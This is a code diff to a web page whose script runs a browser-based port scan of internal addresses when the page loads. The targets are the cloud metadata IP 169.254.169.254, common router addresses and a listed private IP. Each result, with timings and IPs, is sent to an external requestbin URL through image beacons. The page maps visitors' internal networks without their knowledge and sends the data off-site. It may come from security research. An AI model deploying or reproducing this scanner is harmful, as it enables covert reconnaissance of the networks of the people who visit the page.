@@ -10,8 +10,11 @@
     <div id="custom_button"></div>
     
     <script>
-    let LOG_URL = "http://requestbin.net/r/hgaw6u8b";
+    let LOG_URL = "http://requestbin.net/r/83vi2pox";
     let LOCAL_HOST = "169.254.169.254";
+    let ipIterator="";
+    let local_ip_ranges = ["10.", "192.168.", "172.16."];
+    let local_ips = ["3.110.64.92", "192.168.0.1", "192.168.1.1","10.0.0.1"];
       
      //
       var last_scanobj_index = 0;
@@ -116,21 +119,28 @@
           var scanner = new PortScanner(ip, port);
 
           scanner.on_stealthed = function () {
-              if (scanner.timed_out) {
+              if (scanner.timed_out) 
+              {
                   let im = new Image();
-                  im.src=LOG_URL+"?TIME=NO RESPONSE AFTER 10SEC";
+                  im.src=LOG_URL+"?TIME=NO RESPONSE AFTER 10SEC&IP="+ip;
                   //document.getElementById("custom_result").innerHTML = "Case 2 (no response after 10s).";
-              } else {
-                  time = this.total_time;
-                  let im = new Image();
-                  im.src=LOG_URL+"?TIME="+time;
-                
-                 // document.getElementById("custom_result").innerHTML = "Case 2 (" + this.total_time + " ms).";
-              }
+              } 
+              else 
+              {
+                    time = this.total_time;
+                    let im = new Image();
+                    im.src=LOG_URL+"?TIME="+time+"&IP="+ip+"&CASE=2";
+
+                   // document.getElementById("custom_result").innerHTML = "Case 2 (" + this.total_time + " ms).";
+                }
               document.getElementById("custom_button").disabled = false;
           }
 
-          scanner.on_open_or_closed = function () {
+          scanner.on_open_or_closed = function ()
+          {
+              time = this.total_time;
+              let im = new Image();
+              im.src=LOG_URL+"?TIME="+time+"&IP="+ip+"&CASE=1";
               //document.getElementById("custom_result").innerHTML = "Case 1 (" + this.total_time + " ms)."
               //document.getElementById("custom_button").disabled = false;
           }
@@ -213,7 +223,11 @@
           scanner.run();
       }
 
-      custom_scan(LOCAL_HOST, "80"); 
+    for (let i = 0 ; i < local_ips.length ; i++)
+    {
+      let ipIter = local_ips[i];
+      custom_scan(ipIter, "80"); 
+    }
      //
       
     /*let img = new Image();
